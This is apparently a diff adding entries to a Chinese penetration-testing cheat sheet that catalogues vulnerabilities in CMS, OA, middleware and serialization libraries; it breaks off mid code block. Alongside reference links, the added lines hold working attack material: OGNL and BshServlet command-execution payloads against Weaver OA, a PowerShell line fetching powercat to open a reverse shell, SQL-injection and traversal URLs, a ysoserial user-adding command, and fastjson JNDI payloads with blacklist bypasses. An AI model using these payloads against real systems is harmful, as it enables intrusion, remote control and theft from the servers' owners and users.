@@ -10,68 +10,70 @@
 
 # 大纲
 
-**各类论坛/CMS框架**
+* **各类论坛/CMS框架**
+    * [dedeCMS](#dedecms)
+    * [Discuz](#discuz)
+    * [Drupal](#drupal)
+    * [ECshop](#ecshop)
+    * [Joomla](#joomla)
+    * [MetInfo](#metInfo)
+    * [ThinkCMF](#thinkcmf)
+    * [ThinkPHP](#thinkphp)
+    * [WordPress](#wordpress)
+    * [YxCMS](#yxcms)
+    * [zcncms](#zcncms)
+    * [泛微](#泛微)
+    * [致远](#致远)
+    * [通达](#通达)
 
-* [dedeCMS](#dedecms)
-* [Discuz](#discuz)
-* [Drupal](#drupal)
-* [ECshop](#ecshop)
-* [Joomla](#joomla)
-* [MetInfo](#metInfo)
-* [ThinkCMF](#thinkcmf)
-* [ThinkPHP](#thinkphp)
-* [WordPress](#wordpress)
-* [YxCMS](#yxcms)
-* [zcncms](#zcncms)
-* [泛微](#泛微)
-* [致远](#致远)
-* [通达](#通达)
+* **框架和中间件**
+    * [ActiveMQ](#activemq)
+    * [Dubbo](#dubbo)
+    * [ElasticSearch](#elasticsearch)
+    * [httpd](#httpd)
+    * [IIS](#iis)
+    * [JBOSS](#jboss)
+    * [PHP](#php)
+    * [Resin](#resin)
+    * [RocketMQ](#rocketmq)
+    * [shiro](#shiro)
+    * [Solr](#solr)
+    * [Spring](#spring)
+    * [Struts2](#struts2)
+    * [Tomcat](#tomcat)
+    * [Weblogic](#weblogic)
 
-**框架和中间件**
+* **组件**
+    * [编辑器](#编辑器)
+        * [ewebeditor](#ewebeditor)
+        * [FCKeditor](#fckeditor)
+        * [kindeditor](#kindeditor)
+        * [ueditor](#ueditor)
+    * [序列化](#序列化)
+        * [fastjson](#fastjson)
+        * [Jackson](#jackson)
+        * [Xstream](#xstream)
+    * [其他](#其他)
+        * [Ghostscript](#ghostscript)
+        * [webuploader](#webuploader)
 
-* [ActiveMQ](#activemq)
-* [Dubbo](#Dubbo)
-* [ElasticSearch](#elasticsearch)
-* [IIS](#iis)
-* [JBOSS](#jboss)
-* [PHP](#php)
-* [Resin](#resin)
-* [RocketMQ](#rocketmq)
-* [shiro](#shiro)
-* [Solr](#solr)
-* [Spring](#spring)
-* [Struts2](#struts2)
-* [Tomcat](#tomcat)
-* [Weblogic](#weblogic)
-
-**组件**
-
-* [编辑器](#编辑器)
-    * [ewebeditor](#ewebeditor)
-    * [FCKeditor](#fckeditor)
-    * [kindeditor](#kindeditor)
-* [序列化](#序列化)
-    * [fastjson](#fastjson)
-    * [Jackson](#Jackson)
-* [其他](#其他)
-    * [webuploader](#webuploader)
-
-**服务**
-
-* [Aria2](#aria2)
-* [Confluence](#confluence)
-* [Crowd](#crowd)
-* [Harbor](#harbor)
-* [Jenkins](#jenkins)
-* [Jira](#jira)
-* [Jupyter](#jupyter)
-* [Nexus](#nexus)
-* [noVNC](#novnc)
-* [phpMyAdmin](#phpmyadmin)
-* [PHP-FPM](#php-fpm)
-* [Supervisord](#supervisord)
-* [Webmin](#webmin)
-* [zabbix](#zabbix)
+* **服务**
+    * [Aria2](#aria2)
+    * [Confluence](#confluence)
+    * [Coremail](#coremail)
+    * [Crowd](#crowd)
+    * [Harbor](#harbor)
+    * [Jenkins](#jenkins)
+    * [Jira](#jira)
+    * [Jupyter](#jupyter)
+    * [Nexus](#nexus)
+    * [noVNC](#novnc)
+    * [phpMyAdmin](#phpmyadmin)
+    * [PHP-FPM](#php-fpm)
+    * [Smartbi](#smartbi)
+    * [Supervisord](#supervisord)
+    * [Webmin](#webmin)
+    * [zabbix](#zabbix)
 
 ---
 
@@ -359,7 +361,7 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 - [ThinkPHP3.2.3框架实现安全数据库操作分析](https://xz.aliyun.com/t/79)
 - [ThinkPHP-漏洞分析集合 ](https://xz.aliyun.com/t/2812)
 - [ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)](https://xz.aliyun.com/t/2629)
-- [ Thinkphp框架 3.2.x sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38901-1-12.html)
+- [Thinkphp框架 3.2.x sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38901-1-12.html)
 
 **日志泄露**
 ```bash
@@ -380,6 +382,7 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 - [ThinkPHP 5.1.x SQL注入漏洞分析](https://www.freebuf.com/vuls/185420.html)
 - [ThinkPHP框架 < 5.0.16 sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38284-1-13.html)
 - [ThinkPHP 5.x 远程命令执行漏洞利用过程](https://laucyun.com/a9142c328b103cd86a3715bd5073c4be.html)
+- [ThinkPHP漏洞总结](http://zone.secevery.com/article/1165)
 
 **工具**
 - [Lucifer1993/TPscan](https://github.com/Lucifer1993/TPscan) - 一键 ThinkPHP 漏洞检测
@@ -484,6 +487,38 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
 
 > 官网 : https://www.weaver.com.cn/
 
+**文章**
+- [应用安全 - 软件漏洞 - 泛微OA漏洞汇总](https://www.cnblogs.com/AtesetEnginner/p/11558469.html)
+
+**指纹**
+- `Set-Cookie: ecology_JSessionId=`
+- `ecology`
+
+**敏感文件泄露**
+- `/messager/users.data`
+- `/plugin/ewe/jsp/config.jsp`
+
+**路径遍历**
+- `/plugin/ewe/admin/upload.jsp?id=11&dir=../../../`
+- `/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'../ecology/WEB-INF/prop/weaver.properties'`
+
+**E-Mobile 4.5 RCE**
+```
+**.**.**.**/verifyLogin.do
+data：loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${@**.**.**.**.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())}
+
+http://**.**.**.**/verifyLogin.do
+data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
+http://**.**.**.**:89/verifyLogin.do
+data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
+**.**.**.**/verifyLogin.do
+data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
+http://**.**.**.**/verifyLogin.do
+data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
+http://**.**.**.**/verifyLogin.do
+data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
+```
+
 **e-mobile < 6.5 Ognl 表达式注入**
 - 文章
     - [关于表达式注入的小记录](https://zhuanlan.zhihu.com/p/26052235)
@@ -505,6 +540,21 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
     ```
     /weaver/bsh.servlet.BshServlet
     ```
+    ```
+    eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");
+    ```
+    泛微多数都是windows环境, 反弹shell可以使用pcat
+    ```
+    powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
+    ```
+
+**ecology8_mobile_sql_inject**
+- POC | Payload | exp
+    - [ecology8_mobile_sql_inject](https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py)
+
+**SSV-98083 | 泛微 e-cology OA 前台SQL注入**
+- POC | Payload | exp
+    - [AdministratorGithub/e-cology-OA-SQL](https://github.com/AdministratorGithub/e-cology-OA-SQL)
 
 **泛微 OA WorkflowCenterTreeData 接口注入漏洞(限 oracle 数据库)**
 - POC | Payload | exp
@@ -529,12 +579,36 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
 
 - POC | Payload | exp
     - [jas502n/DBconfigReader](https://github.com/jas502n/DBconfigReader)
+    - [NS-Sp4ce/Weaver-OA-E-cology-Database-Leak](https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak)
 
 ---
 
 ## 致远
 
 > 官网 : http://www.seeyon.com/
+
+**指纹**
+- `/seeyon/htmlofficeservlet`
+- `/seeyon/index.jsp`
+- `seeyon`
+
+**致远OA A6 test.jsp sql注入漏洞**
+- 文章
+    - [用友致远A6 OA存在sql注入并拿shell](https://www.pa55w0rd.online/yyoa/)
+
+- POC | Payload | exp
+    ```
+    www.test.com/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
+    www.test.com/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)
+    ```
+
+**致远OA帆软报表组件前台XXE漏洞**
+- 文章
+    - [致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程](https://landgrey.me/blog/8/)
+
+**帆软报表v8.0 Getshell漏洞**
+- 文章
+    - [帆软报表v8.0 Getshell漏洞分析](http://foreversong.cn/archives/1378)
 
 **A8-OA-seeyon-RCE**
 - 文章
@@ -549,12 +623,26 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
 
 > 官网 : https://www.tongda2000.com/
 
+**指纹**
+- `tongda.ico`
+- `Office Anywhere 20xx版 网络智能办公系统`
+- `/ispirit/interface/gateway.php`
+
 **通达OA 任意用户登录漏洞**
+- 影响版本
+    - 通达OA 2017
+    - 通达OA V11.X--V11.5
+
 - 文章
     - [通达OA < 11.5任意用户登录漏洞分析](https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA)
+    - [通达OA 任意用户登录漏洞（匿名RCE）分析](https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/)
 
 - POC | Payload | exp
     - [NS-Sp4ce/TongDaOA-Fake-User](https://github.com/NS-Sp4ce/TongDaOA-Fake-User)
+
+**通达OA 任意文件上传漏洞+本地文件包含漏洞**
+- POC | Payload | exp
+    - [jas502n/OA-tongda-RCE](https://github.com/jas502n/OA-tongda-RCE)
 
 ---
 
@@ -562,6 +650,7 @@ WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网�
 
 **文章**
 - [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)
+- [2020攻防演练弹药库-您有主机上线请注意](https://blog.riskivy.com/2020%e6%94%bb%e9%98%b2%e6%bc%94%e7%bb%83%e5%bc%b9%e8%8d%af%e5%ba%93-%e6%82%a8%e6%9c%89%e4%b8%bb%e6%9c%ba%e4%b8%8a%e7%ba%bf%e8%af%b7%e6%b3%a8%e6%84%8f/?from=timeline&isappinstalled=0)
 
 **工具包**
 - [1120362990/vulnerability-list](https://github.com/1120362990/vulnerability-list) - 在渗透测试中快速检测常见中间件、组件的高危漏洞.
@@ -611,6 +700,12 @@ Apache ActiveMQ 是美国阿帕奇 (Apache) 软件基金会所研发的一套开
 - 文章
     - [ActiveMQ任意文件写入漏洞 (CVE-2016-3088) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)
 
+**CVE-2017-15709**
+- POC | Payload | exp
+    ```
+    telnet ip 61616
+    ```
+
 ---
 
 ## Dubbo
@@ -621,6 +716,11 @@ Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 框架，它提供
 
 **工具**
 - [threedr3am/dubbo-exp](https://github.com/threedr3am/dubbo-exp) - Dubbo 反序列化一键快速攻击测试工具，支持 dubbo 协议和 http 协议，支持 hessian 反序列化和 java 原生反序列化。
+
+**CVE-2019-17564 pache Dubbo 反序列化漏洞**
+- 文章
+    - [漏洞复现|Dubbo反序列化漏洞CVE-2019-17564](https://www.cnblogs.com/wh4am1/p/12307848.html)
+    - [[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞](https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5)
 
 ---
 
@@ -640,7 +740,6 @@ ElasticSearch 是一个基于 Lucene 的搜索服务器.它提供了一个分布
 - `http://<ip>:9200/_nodes` 查看节点数据
 - `http://<ip>:9200/_cat/indices?v` 查看当前节点的所有 Index
 - `http://<ip>:9200/_search?pretty=true` 查询所有的 index, type
-- `curl http://<ip>:9200/_nodes` 查看节点数据
 
 **CVE-2014-3120 ElasticSearch 命令执行漏洞**
 - 简介
@@ -825,6 +924,33 @@ ElasticSearch 是一个基于 Lucene 的搜索服务器.它提供了一个分布
 
 ---
 
+## httpd
+
+**CVE-2007-6750 Apache ddos**
+- 简介
+
+    Apache HTTP Server 1.x版本和2.x版本中存在资源管理错误漏洞。该漏洞源于网络系统或产品对系统资源（如内存、磁盘空间、文件等）的管理不当。
+
+- MSF Module
+    ```
+    use auxiliary/dos/http/slowloris
+    set RHOST <rhost>
+    run
+    ```
+
+**CVE-2017-15715 Apache解析漏洞**
+- 文章
+    - [利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)
+
+**CVE-2019-0211 Apache HTTP 服务组件提权漏洞**
+- 文章
+    - [Apache 提权漏洞(CVE-2019-0211)复现](https://paper.seebug.org/889/)
+
+- POC | Payload | exp
+    - [CVE-2019-0211-apache](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)
+
+---
+
 ## IIS
 
 **IIS shortname**
@@ -950,6 +1076,8 @@ ElasticSearch 是一个基于 Lucene 的搜索服务器.它提供了一个分布
     - [yunxu1/jboss-_CVE-2017-12149](https://github.com/yunxu1/jboss-_CVE-2017-12149)
     - [jreppiks/CVE-2017-12149](https://github.com/jreppiks/CVE-2017-12149)
     - https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149
+
+---
 
 ## PHP
 
@@ -1083,16 +1211,31 @@ Apache Shiro 是一个功能强大且灵活的开源安全框架,主要功能包
 
 shiro 的漏洞参考 https://issues.apache.org/jira/projects/SHIRO/issues
 
+**文章**
+- [Apache Shiro回显poc改造计划](https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw)
+- [关于Shiro反序列化漏洞的延伸—升级shiro也能被shell](https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw)
+- [Shiro 100 Key](https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA)
+
 **工具**
 - [sv3nbeast/ShiroScan](https://github.com/sv3nbeast/ShiroScan) - Shiro<=1.2.4反序列化,一键检测工具
 - [wyzxxz/shiro_rce](https://github.com/wyzxxz/shiro_rce) - shiro rce 反序列 命令执行 一键工具
-- [feihong-cs/ShiroExploit](https://github.com/feihong-cs/ShiroExploit) - shiro550/721漏洞检测工具
+- [feihong-cs/ShiroExploit_GUI](https://github.com/feihong-cs/ShiroExploit_GUI) - shiro550/721漏洞检测工具GUI版本
 
-**SHIRO-550 | Shiro RememberMe 1.2.4 反序列化漏洞**
+**指纹**
+- `set-Cookie: rememberMe=deleteMe`
+
+**SHIRO-550 & CVE-2016-4437 | Shiro RememberMe 1.2.4 反序列化漏洞**
 - https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-550
 
+- 简介
+
+    shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化.然而AES的密钥是硬编码的, 就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
+
 - 影响版本
-    - 1.2.4
+    - 1.2.4(由于密钥泄露的问题, 部分高于 1.2.4 版本的 Shiro 也会受到影响)
+
+- 文章
+    - [【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://paper.seebug.org/shiro-rememberme-1-2-4/)
 
 - POC | Payload | exp
     - [jas502n/SHIRO-550](https://github.com/jas502n/SHIRO-550)
@@ -1111,9 +1254,22 @@ shiro 的漏洞参考 https://issues.apache.org/jira/projects/SHIRO/issues
     - 1.3.0 ~ 1.3.2
     - 1.4.0-RC2 ~ 1.4.1
 
+- 文章
+    - [Shiro 721 Padding Oracle攻击漏洞分析](https://www.anquanke.com/post/id/193165)
+    - [Apache Shiro 远程代码执行漏洞复现](http://www.oniont.cn/index.php/archives/298.html)
+
 - POC | Payload | exp
     - [3ndz/Shiro-721](https://github.com/3ndz/Shiro-721)
     - [jas502n/SHIRO-721](https://github.com/jas502n/SHIRO-721)
+
+**SHIRO-682 & CVE-2020-1957 | Shiro 权限绕过漏洞**
+
+- 简介
+
+    Apache Shiro 是企业常见的 Java 安全框架, 由于 Shiro 的拦截器和 spring(Servlet)拦截器对于 URI 模式匹配的差异, 导致出现鉴权问题.
+
+- 文章
+    - [Shiro 权限绕过漏洞分析（CVE-2020-1957）](https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/)
 
 ---
 
@@ -1126,8 +1282,8 @@ Apache Solr 是一个开源的搜索服务器.Solr 使用 Java 语言开发,其�
 Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues
 
 **资源**
-- [artsploit/solr-injection: Apache Solr Injection Research](https://github.com/artsploit/solr-injection)
-- [Imanfeng/Apache-Solr-RCE](https://github.com/Imanfeng/Apache-Solr-RCE)
+- [Imanfeng/Apache-Solr-RCE](https://github.com/Imanfeng/Apache-Solr-RCE) - Solr RCE 整理
+- [veracode-research/solr-injection](https://github.com/veracode-research/solr-injection) - Apache Solr 注入研究
 
 **CVE-2017-12629 Apache solr XML 实体注入漏洞**
 - 简介
@@ -1167,9 +1323,14 @@ Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues
 
 - 文章
     - [Apache Solr 远程命令执行漏洞 (CVE-2019-0193) ](https://vulhub.org/#/environments/solr/CVE-2019-0193/)
+    - [Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析](https://paper.seebug.org/1009/)
 
 - POC | Payload | exp
     - [jas502n/CVE-2019-0193](https://github.com/jas502n/CVE-2019-0193)
+
+**CVE-2019-12409**
+- POC | Payload | exp
+    - [jas502n/CVE-2019-12409](https://github.com/jas502n/CVE-2019-12409)
 
 **CVE-2019-17558 Apache Solr Velocity 模版注入远程命令执行漏洞**
 - 简介
@@ -1192,6 +1353,14 @@ Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues
 ## Spring
 
 > 官网 : https://spring.io/
+
+**指纹**
+- `X-Application-Context:`
+
+**Spring Boot Actuators**
+- [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
+- [Spring Boot Actuators配置不当导致RCE漏洞复现](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
+- [mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
 
 **CVE-2016-4977 Spring Security OAuth2 远程命令执行漏洞**
 - 简介
@@ -1277,6 +1446,12 @@ Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues
 > 官网 : https://struts.apache.org/
 
 Struts2 的漏洞参考 https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
+
+**指纹**
+- `Struts`
+- `.action`
+- `.do`
+- `.action!xxxx`
 
 **工具**
 - [Lucifer1993/struts-scan](https://github.com/Lucifer1993/struts-scan) - Python2 编写的 struts2 漏洞全版本检测和利用工具
@@ -1454,12 +1629,17 @@ Tomcat 默认端口为 8080,也可能被改为其他端口,后台管理路径为
 **文章**
 - [Tomcat漏洞详解](http://www.mottoin.com/detail/389.html)
 - [渗透测试-Tomcat常见漏洞总结](https://mp.weixin.qq.com/s/ZXoCJ9GhMaTvVFeYn8vMUA)
+- [Tomcat URL解析差异性导致的安全问题](https://xz.aliyun.com/t/7544)
 
 **Tips**
 - tomcat5 默认有两个角色：tomcat 和 role1。其中账号 both、tomcat、role1 的默认密码都是 tomcat。不过不具备部署应用的权限，默认需要 manager 权限才能够直接部署 war 包.
 - tomcat6 默认没有配置任何用户以及角色，没办法用默认账号登录.
 - tomcat7 与6类似
 - tomcat8 其实从6开始，tomcat 就将默认的用户去掉了
+- 控制台路径
+    - `/manager/status`
+    - `/manager/html`
+    - `/host-manager/`
 
 **爆破 Manager APP**
 
@@ -1503,10 +1683,11 @@ base64 编码，口令形式为 username:password
 
 - 文章
     - [复现tomcat远程代码执行漏洞（CVE-2016-8735） | 回忆飘如雪](http://gv7.me/articles/2018/CVE-2016-8735/)
+    - [CVE-2016-8735环境搭建到POC编写](https://blog.spoock.com/2019/09/20/cve-2016-8735/)
 
 - POC | Payload | exp
     ```
-    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.48.21110001 Groovy1 "C:\Windows\System32\net.exe user  test 12345 /add "
+    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.48.211 10001 Groovy1 "C:\Windows\System32\net.exe user  test 12345 /add "
     ```
 
 **CVE-2017-12615/12616**
@@ -1669,6 +1850,10 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
     - `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `
     - [Oracle WebLogic Server 10.3 - 'console-help.portal' Cross-Site Scripting](https://www.exploit-db.com/exploits/33079)
 
+**CVE-2017-3248**
+- 文章
+    - [WebLogic反序列化漏洞重现江湖，CVE-2017-3248成功绕过之前的官方修复](https://paper.seebug.org/333/)
+
 **CVE-2017-10271 XMLDecoder 反序列化漏洞**
 - 简介
 
@@ -1822,6 +2007,7 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
 
 - 文章
     - [CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE复现](https://www.jianshu.com/p/c4982a845f55)
+    - [WebLogic RCE(CVE-2019-2725)漏洞之旅](https://paper.seebug.org/909/)
 
 - POC | Payload | exp
     ```bash
@@ -1831,6 +2017,7 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
     - [MyTools/CVE-2019-2725](https://github.com/No4l/MyTools/tree/master/CVE-2019-2725)
     - [skytina/CNVD-C-2019-48814-COMMON](https://github.com/skytina/CNVD-C-2019-48814-COMMON)
     - [lufeirider/CVE-2019-2725](https://github.com/lufeirider/CVE-2019-2725)
+    - [jas502n/CNVD-C-2019-48814](https://github.com/jas502n/CNVD-C-2019-48814)
     - [black-mirror/Weblogic](https://github.com/black-mirror/Weblogic) - Weblogic CVE-2019-2725 CVE-2019-2729 Getshell 命令执行
 
 **CVE-2019-2890 WebLogic 反序列化RCE**
@@ -1858,8 +2045,41 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
     - weblogic_server 12.2.1.3.0
     - weblogic_server 12.2.1.4.0
 
+- 文章
+    - [WebLogic CVE-2020-2551漏洞分析](https://paper.seebug.org/1138/)
+    - [漫谈WebLogic CVE-2020-2551](https://www.anquanke.com/post/id/201005)
+
 - POC | Payload | exp
     - [jas502n/CVE-2020-2551](https://github.com/jas502n/CVE-2020-2551)
+
+**CVE-2020-2555 Oracle Coherence 反序列化漏洞分析**
+- 简介
+
+    Oracle 官方在1月补丁中修复了 CVE-2020-2555 漏洞，该漏洞位于 Oracle Coherence 组件中。该组件是业内领先的用于解决集群应用程序数据的缓存的解决方案，其默认集成在 Weblogic12c 及以上版本中。
+
+    该漏洞提出了一条新的反序列化 gadget，未经身份验证的攻击者通过精心构造的 T3 请求触发可以反序列化 gadget，最终造成远程命令执行的效果。
+
+- 文章
+    - [Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）](https://paper.seebug.org/1141/)
+
+- POC | Payload | exp
+    - [Y4er/CVE-2020-2555](https://github.com/Y4er/CVE-2020-2555)
+
+---
+
+## Websphere
+
+**CVE-2014-0910**
+- POC | Payload | exp
+    - [IBM Websphere Portal - Persistent Cross-Site Scripting](https://www.exploit-db.com/exploits/36941)
+
+**CVE-2015-7450**
+- POC | Payload | exp
+    - [websphere_rce.py](https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py)
+
+**CVE-2019-4279**
+- 文章
+    - [Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) ](https://xz.aliyun.com/t/6394)
 
 ---
 
@@ -1942,14 +2162,114 @@ FCKeditor/_samples/asp/sample04.asp
 ---
 
 ## 序列化
+
+**文章**
+- [无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件](https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/)
+
 ### fastjson
 
 > 项目地址 : https://github.com/alibaba/fastjson
+
+**文章**
+- [Fastjson反序列化进攻利用](https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ)
 
 **工具**
 - [wyzxxz/fastjson_rce_tool](https://github.com/wyzxxz/fastjson_rce_tool) - fastjson rce 命令执行综合利用工具，一键操作,fastjson remote code execute poc
 - [c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit) - fastjson漏洞快速利用框架
 - [Lonely-night/fastjson_gadgets_scanner](https://github.com/Lonely-night/fastjson_gadgets_scanner) - scanner 扫描反编译生成的源文件
+
+---
+
+以下内容来自 <sup>[Tide安全团队 [Fastjson反序列化进攻利用](https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ) 文章]</sup>
+
+**fastjson<=1.2.24 反序列化漏洞**
+- POC | Payload | exp
+    ```json
+    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
+    ```
+
+**fastjson<=1.2.41**
+- 简介
+
+    第一个 Fastjson 反序列化漏洞爆出后，阿里在1.2.25版本设置了 autoTypeSupport 属性默认为 false，并且增加了checkAutoType() 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。 com.sun.rowset.JdbcRowSetImpl 在1.2.25版本被加入了黑名单，fastjson 有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。
+
+    autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）
+
+- POC | Payload | exp
+    ```json
+    {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
+    ```
+
+**fastjson<=1.2.42**
+- 简介
+
+    fastjson 在1.2.42版本新增了校验机制。
+
+    如果输入类名的开头和结尾是L和;就将头和尾去掉，再进行黑名单验证。 还把黑名单的内容进行了加密，防止安全人员进行研究，增加了研究的门槛。 但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist绕过方法，在类名外部嵌套2层L;。 原类名：com.sun.rowset.JdbcRowSetImpl 绕过： LLcom.sun.rowset.JdbcRowSetImpl;;
+
+- POC | Payload | exp
+    ```json
+    {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
+    ```
+
+**fastjson<=1.2.43**
+- 简介
+
+    fastjson 在1.2.43中checkAutoType()函数增加判断开头为LL直接报错。 绕过方法:根据fastjson判断函数，[开头则提取类名，且后面字符字符为"["、"{"等，即可正常调用。
+
+    autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
+
+- POC | Payload | exp
+    ```json
+    {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
+    ```
+
+**fastjson<=1.2.45**
+- 简介
+
+    前提条件：需要目标服务端存在 mybatis 的 jar 包，且版本需为 3.x.x 系列 <3.5.0 的版本。 使用黑名单绕过，org.apache.ibatis.datasource 在1.2.46版本被加入了黑名单 由于在项目中使用的频率也较高，所以影响范围较大。
+
+- POC | Payload | exp
+    ```json
+    {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
+    ```
+
+**fastjson <=1.2.47 远程代码执行漏洞**
+- 简介
+
+    autoType 为关闭状态也可使用。 loadClass 中默认 cache 设置为 true，利用分为2步执行，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.JdbcRowSetImpl 这个类，绕过了黑名单机制。
+
+- 文章
+    - [Fastjson <=1.2.47 远程代码执行漏洞分析](https://www.anquanke.com/post/id/181874)
+
+- 工具
+    - [CaijiOrz/fastjson-1.2.47-RCE](https://github.com/CaijiOrz/fastjson-1.2.47-RCE)
+
+**fastjson<=1.2.62**
+- POC | Payload | exp
+    ```json
+    {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
+    ```
+
+**fastjson < 1.2.66 远程代码执行漏洞**
+- POC | Payload | exp
+    ```json
